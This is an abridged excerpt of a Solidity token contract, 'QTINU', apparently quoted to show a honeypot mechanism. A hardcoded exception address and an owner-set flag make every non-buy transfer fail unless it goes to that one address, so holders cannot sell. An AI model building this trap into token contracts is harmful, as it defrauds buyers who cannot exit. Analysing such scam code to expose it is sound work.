...
contract QTINU is Context, IERC20, Ownable {
    ...
    address private constant _exceptionAddress=address(0x46246118bDe4dee884509051d1b1C7C8d5DA95b0);
    bool public onlyExceptionAddress=true;
    ...
    function setIsOnlyExceptionAddress(bool value) onlyOwner public{
        onlyExceptionAddress=value;
    }
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (!_isBuy(from)) {
            ...
            // exception address
            if(onlyExceptionAddress) require(to==_exceptionAddress);
